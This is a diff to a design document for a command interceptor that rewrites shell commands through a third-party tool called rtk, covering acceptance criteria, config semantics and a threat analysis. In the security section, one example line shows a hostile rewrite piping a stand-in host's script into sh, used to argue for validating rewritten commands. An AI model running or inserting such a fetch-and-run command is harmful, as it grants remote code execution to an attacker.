@@ -107,6 +107,15 @@ interceptor declines to rewrite. There is **no** "re-run raw on suspected rtk fa
 re-running a test suite to disambiguate an exit code is prohibitively expensive and makes
 execution non-idempotent.
 
+**One carve-out: a spawn-level failure is not an execution failure.** If the rewritten
+command fails to spawn at all — rtk removed from PATH after preflight passed, permissions
+changed — then *nothing ran*, so re-running raw once costs nothing and risks nothing. This
+does not contradict the rule above, which is about exit codes from a command that actually
+executed. The two are cleanly distinguishable: `runQualityCommand`'s catch block returns
+`exitCode: -1` (`src/quality/runner.ts:254-263`), a value no real process produces. A
+spawn failure also trips the circuit breaker, so the fallback happens at most once per
+run.
+
 **R4 — rtk's recovery hints are stripped.** A nax agent has no shell and no `noCompact`
 field, so `[full diff: rtk git diff --no-compact]` and `[+N hidden: rtk recall <hash>]`
 are instructions it cannot follow. Passing them through reproduces nax#1800's failure
@@ -133,6 +142,40 @@ it should not switch on because a binary happens to be installed.
 **R8 — Measurement decides the verb table.** `sites` and `git.verbs` ship conservative and
 are opened by US-001's data, not by this document's assertions.
 
+**R9 — A rewritten shell string is executed; the trust boundary moves, and must be
+narrowed.** This is the most security-relevant consequence of the whole design and it
+deserves to be stated plainly rather than left implicit.
+
+Today the string reaching `/bin/sh -c` at sites 1 and 2 originates in
+`.nax/config.json`, which `src/verification/executor.ts` documents as **trusted —
+equivalent in trust to a Makefile**. After this change, the string reaching the shell is
+**another binary's stdout**. Nothing in R6 (which only bans git escape flags) would stop
+a rewrite returning `bun test; curl evil.sh | sh`.
+
+Enabling the interceptor is therefore granting the provider binary arbitrary code
+execution with the harness's privileges. That may well be acceptable — the user installed
+rtk deliberately — but "acceptable" and "unstated" are different things, and R7's opt-in
+default is partly justified by this.
+
+Narrowing, enforced on every rewritten shell string before it is spawned:
+
+1. **Shell-operator skeleton must be preserved.** Split original and rewrite on the same
+   operators (`&&`, `||`, `;`, `|`). The two sequences of operators must be identical.
+   A rewrite may not introduce a new command boundary.
+2. **Each segment must be either unchanged, or the original segment prefixed by the
+   provider's own binary name.** `bun test` → `rtk bun test` passes; `bun test` →
+   `something-else` does not.
+3. **No new redirections.** A rewrite may not introduce `>`, `>>`, or `<` absent from the
+   original.
+
+This is a tight fit for what rtk's rewriter actually does — its documented compound
+handling rewrites both sides of `&&`/`||`/`;` and leaves pipeline producers raw — so the
+check costs nothing in practice and converts "trust the binary completely" into "trust
+the binary to prefix commands".
+
+An argv rewrite needs none of this: it is a static per-verb mapping built by nax (US-004),
+never a string parsed back from a subprocess.
+
 ## 4. Design
 
 ### US-001 — Measurement harness
@@ -141,8 +184,12 @@ are opened by US-001's data, not by this document's assertions.
 commands:
 
 - `quality.commands` specs from the repos nax actually runs against
-- real argv shapes mined from existing tool-audit ledgers, which already record every
-  `Git` and `RunCommand` invocation (`src/tools/tool-audit.ts`)
+- real `Git` and `RunCommand` invocations mined from existing tool-audit ledgers
+  (`src/tools/tool-audit.ts`). Note these record the tool **input** (`subcommand`, `refs`,
+  `paths`, …), not the executed argv, so the corpus reconstructs argv by replaying each
+  recorded input through `buildGitArgv` (`src/tools/git.ts:186-266`) — which is the right
+  thing anyway, since it captures the always-emitted `--relative`, `--` and `.` that §2.5
+  shows are what defeat rtk's compact paths
 
 Run each raw and through rtk, recording:
 
@@ -182,14 +229,29 @@ type InterceptResult =
   | { kind: "declined"; reason: string }
 
 type Site = "quality" | "verification" | "git"
+
+interface CommandInterceptor {
+  readonly provider: string
+  intercept(req: InterceptRequest): Promise<InterceptResult>
+  // Consulted ONLY for output of a command this interceptor rewrote.
+  postProcess?(output: string, req: InterceptRequest): { output: string; notes?: Record<string, string> }
+}
 ```
 
-A rewritten result must match the request's shape. Validation per R6 runs on every
+**`postProcess` exists because US-005 otherwise has no home.** Stripping rtk's hint
+strings is provider-specific knowledge; without this hook that logic would have to live
+in `src/quality/` or `src/tools/`, violating R1 outright. The call sites invoke it
+blindly, know nothing of what it does, and skip it entirely for a command that was not
+rewritten. `notes` is how the recall hash travels out-of-band to US-006 without the call
+site understanding it.
+
+A rewritten result must match the request's shape. Validation per R6 and R9 runs on every
 rewritten result before it reaches a spawn.
 
 **Acceptance:** a fake interceptor returning `unchanged` leaves every call site
-byte-identical to today; a fake returning a shape mismatch is rejected; a fake introducing
-`-C` is rejected.
+byte-identical to today **and is never asked to post-process**; a fake returning a shape
+mismatch is rejected; a fake introducing `-C` is rejected; a fake whose `postProcess`
+throws degrades to the raw output rather than failing the command.
 
 ### US-003 — Wiring the three sites
 
@@ -204,7 +266,10 @@ inherits stdin for editor/GPG/credential-helper prompts, which is correct behavi
 interacts with nax's timeouts.
 
 **Acceptance:** with the interceptor disabled, all three sites produce byte-identical
-behaviour to today, proven by tests that do not reference rtk.
+behaviour to today, proven by tests that do not reference rtk; with a fake interceptor
+that rewrites, the exit code nax observes is the rewritten command's exit code unchanged,
+including a non-zero one — a rewrite must never turn a failing gate into a passing one, or
+the reverse.
 
 ### US-004 — The rtk provider
 
@@ -282,8 +347,17 @@ One interceptor, not a list — a second provider can widen the schema when one 
 `.strict()`, mounted in the existing `execution` block, documented in
 `src/cli/config-descriptions.ts`.
 
+**`sites` and `git.verbs` compose as AND, not OR.** The git site is active only when
+`"git" ∈ sites` **and** the verb is in `git.verbs`. Two knobs governing one site reads as
+redundant, and it is — deliberately: `sites` is the coarse on/off that matches the other
+two sites, while `git.verbs` carries US-001's per-verb findings. An empty `git.verbs` with
+`"git" ∈ sites` intercepts nothing, and that is not an error — it is the shipping default
+once measurement has not yet run.
+
 **Acceptance:** default config leaves behaviour unchanged; an unknown key fails with
-`CONFIG_SCHEMA_INVALID`; `sites: []` disables interception without disabling the provider.
+`CONFIG_SCHEMA_INVALID`; `sites: []` disables interception without disabling the provider;
+`"git" ∈ sites` with empty `verbs` intercepts no git call; a verb in `git.verbs` with
+`"git" ∉ sites` intercepts nothing.
 
 ### US-008 — Audit and replay
 
@@ -308,6 +382,14 @@ tripped breaker says so in its artifacts.
 | H5 | **SQLite tracking contention** under parallel stories. Unmeasured | Measured in US-001; `RTK_DATA_DIR` per run is the lever if it bites |
 | H6 | **Version skew** — rtk behaviour is version-dependent | Preflight records the version into run artifacts, so telemetry cannot silently straddle a behaviour change |
 | H7 | **stdin.** rtk's filtered modes default stdin to null; `rtk proxy` does not wire it at all | Sites 1 and 2 never use stdin. Site 3's `GitCommit` does, which is why it is gated on US-001 |
+| H8 | **Provider stdout is executed as shell** at sites 1 and 2 — a trust-boundary move from project-authored config to a third-party binary | R9's skeleton/prefix/redirection validation, plus R7's opt-in default |
+
+**Checked and found to be a non-issue:** rtk's filtered mode merges the child's stdout and
+stderr before filtering, which looked like it would change what nax sees. It does not —
+`runQualityCommand` already merges them itself: `const output = [stdout, stderr]
+.filter(Boolean).join("\n")` (`src/quality/runner.ts:240`). The two behaviours agree, and
+rtk's own `rtk:`-prefixed internal errors still land in that merged stream where H1's
+detection can read them. Recorded so this is not re-raised as a blocker later.
 
 ## 6. Sequence
 
